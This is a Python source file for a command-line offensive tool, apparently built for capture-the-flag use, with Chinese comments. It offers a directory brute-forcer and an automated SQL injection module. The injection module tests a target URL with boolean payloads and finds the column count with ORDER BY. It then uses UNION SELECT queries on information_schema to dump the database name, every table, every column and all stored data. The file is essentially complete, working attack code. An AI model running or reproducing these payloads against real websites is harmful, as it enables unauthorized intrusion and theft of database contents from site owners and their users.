#coding=utf-8
import requests
import time
import re
import sys
import difflib


def get_list(dictfilename): 
    # 获取字典进行爆破
    try:
        with open(dictfilename, "r", encoding='utf-8') as f:
            content = f.read().splitlines()
        return content
    except Exception as e:
        print("\nCan not find the file!\n")
        sys.exit(0)


def url_test(): 
    # 敏感信息泄露测试
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'
    }
    url = input("\nPlease input the target url like ( https://target.com ) : ") # url
    dictfilename = input("\nDo you have your own dictfilename? (y/n): ")

    if dictfilename == "y":
        dictfilename = input("\nInput your dictfilename: ")

    elif dictfilename == "yes":
        dictfilename = input("\nInput your dictfilename: ")
        
    else:
        dictfilename = "dict.txt"
        print("\nI will use the default dictfile!")

    wordlists = get_list(dictfilename) # get wordlists
    print("\nTarget url: " + url + "\n")
    for d in wordlists:
        try:
            url1 = url + d
            html = requests.get(url1, headers = headers, timeout = 5)
            html_size = str(len(html.text)) # html size
            html_code = str(html.status_code) # html status code
            url1 = url
        
            print(time.strftime("%m-%d %H:%M:%S", time.localtime()),end = "")
            print("     " + d.ljust(20) + "     " + "Size: " + html_size.ljust(9) + "     " + "Status: " + html_code )
        
        except Exception as e:
            print("Connect error or timeout!")
            print(e+"\n")
            pass
    
    print("\n\n\n")


def sql_get_params():
    http_method = input("\nPlease choose the HTTP request method, GET or POST ? (GET/POST): ")
    if http_method == "GET":
        target = input("\nInput the target url like ( http://xxx.com/index.php?id=1 ) : ")
        data = r"\?\w+"
        params = re.search(data, target)
        params = params.group(0)
        params = str(re.sub(r"\?", "", params))
        #print(params)

        data = r"\&\w+"
        params2 = re.findall(data, target)
        for par in params2:
            par = re.sub(r"\&", "", par)
            params = params + "," + par
        params = params.split(",")
        return params, target
            

    elif http_method == "POST":
        target = input("\nInput the target url like ( http://xxx.com/index.php ) : ")
        test_data = input("\nInput the test data, split by \",\" : ")
        params = test_data.split(",")
        return params, target
    
    else:
        print("ERROR!! Please retry!!")
        sql_get_params()
    

def sql_detect(url, params):
    if re.search(r"\?",url): # get method
        origin_html = requests.get(url).text
        url1 = url + "%27%20and%201=1--+"
        test1_html = requests.get(url1).text
        url2 = url + "%27%20and%201=2--+"
        test2_html = requests.get(url2).text
        s = difflib.SequenceMatcher(None, test1_html, test2_html)
        result = s.ratio()
        #print(s.ratio())
        if float(result) <= 0.9:
            print('\nTarget maybe injectable...\nContinue testing...\n')
            url3 = url + "%27%20order%20by%201--+"
            test4_html = requests.get(url3).text
            for x in range(2,20):
                url3 = url + "%27%20order%20by%20{0}--+" .format(x)
                test3_html = requests.get(url3).text
                d = difflib.SequenceMatcher(None, test3_html, test4_html).ratio()
                if d < 0.95:
                    list_number = x-1
                    return list_number
                else:
                    pass
        
        else:
            print('Target might not be injectable!')

    else:
        print('1') # post
        

def sql_inject(list_number, url):
    payload = "=%27%20union%20select%20"
    x = 1
    while x < list_number:
        payload = payload + "%27udlrbaba%27," 
        x = x + 1
    payload = payload + "%27udlrbaba%27--+"
    url1 = re.sub(r"=\w+", "", url)
    #print(url1)
    #print("------------------------------")
    url1 = url1 + payload
    
    result_html = requests.get(url1).text
    data = r"......udlrbaba.+"
    params = re.search(data, result_html)
    #print (result_html)

    if params == None:
        print('Inject failed!')
    
    else:
        params = str(params.group(0))
        symbol1 = params.split("udlrbaba") # 回显标识
        sql_database = str(re.sub(r"%27udlrbaba%27","database()", url1))
        result_html = requests.get(sql_database).text
        database = re.findall(symbol1[0] + r".+" + symbol1[1], result_html) # 抓取回显
        database = ','.join(database)
        database = re.sub(symbol1[0],"", database)
        database = re.sub(symbol1[1],"", database)
        print("Database is : "+ database + "\n") # 数据库回显
        print("--------------------------\n")

        sql_table = str(re.sub(r"%27udlrbaba%27","group_concat(table_name)", url1))
        sql_table = str(re.sub(r"--\+","", sql_table))
        sql_table = sql_table + "%20from%20information_schema.tables%20where%20table_schema=database()--+"
        sql_column = sql_table
        result_html = requests.get(sql_table).text
        sql_table = re.findall(symbol1[0] + r".+" + symbol1[1], result_html) # 抓取回显
        sql_table1 = ','.join(sql_table)
        sql_table1 = re.sub(symbol1[0],"", sql_table1)
        sql_table1 = re.sub(symbol1[1],"", sql_table1)
        print("Tables : " + sql_table1 + "\n")   # 表回显
        print("--------------------------\n")

        '''
        列处理
        '''
        sqltable = sql_table1.split(',')
        sql_column = str(re.sub(r"table_name","column_name", sql_column))
        sql_column = str(re.sub(r"information_schema.tables","information_schema.columns", sql_column))
        sql_column = str(re.sub(r"table_schema","table_name", sql_column))
        sql_column = str(re.sub(r"database\(\)--\+","", sql_column))
        sql_data1 = sql_column
        sql_data1 = str(re.sub(r"information_schema\.columns%20where%20table_name=","", sql_data1))
        #print(sql_data)
        for i in sqltable: # 表名列表
            sql_column1 = sql_column + "%27" + i + "%27--+"
            result_html = requests.get(sql_column1).text
            sql_column1 = re.findall(symbol1[0] + r".+" + symbol1[1], result_html) # 抓取回显
            # sql_column1 列名的列表
            sql_column1 = ','.join(sql_column1)
            sql_column1 = re.sub(symbol1[0],"", sql_column1)
            sql_column1 = re.sub(symbol1[1],"", sql_column1)
            columns = sql_column1
            columns = columns.split(',')
            print("Table " + i + "\n" + sql_column1 + "\n")

            for x in columns:
                sql_data = str(re.sub(r"group_concat\(column_name\)", x, sql_data1))
                sql_data = sql_data + database + "." + i + "--+"
                final_result = requests.get(sql_data).text
                sql_data = re.findall(symbol1[0] + r".+" + symbol1[1], final_result) # 抓取回显
                sql_data = ','.join(sql_data)
                sql_data = re.sub(symbol1[0],"", sql_data)
                sql_data = re.sub(symbol1[1],"", sql_data)
                print("Data in " + x + ": " + sql_data)
            print("\n")
            



          


def main():
    print('''                                       
                          
╔═╗ ┌┬┐ ┌─┐  ┌┬┐ ┌─┐ ┌─┐ ┬  ┌─┐          --  version 1.0
║    │  ├┤    │  │ │ │ │ │  └─┐          --  du1ge
╚═╝  ┴  └     ┴  └─┘ └─┘ ┴─┘└─┘\n\n\n''')
    user_choice = input("Please choose a module:\n\n1. Web sensitive directory test.\n\n2. SQL Injection detect.\n\n")
    if user_choice == '1':
        url_test()
    elif user_choice == '2':
        params, url = sql_get_params()
        list_number = sql_detect(url, params)
        sql_inject(list_number, url)
        
        

    

if __name__ == '__main__':
    try:
        main()
        
    except KeyboardInterrupt:
        print("\nUser interrupt...\n\n")
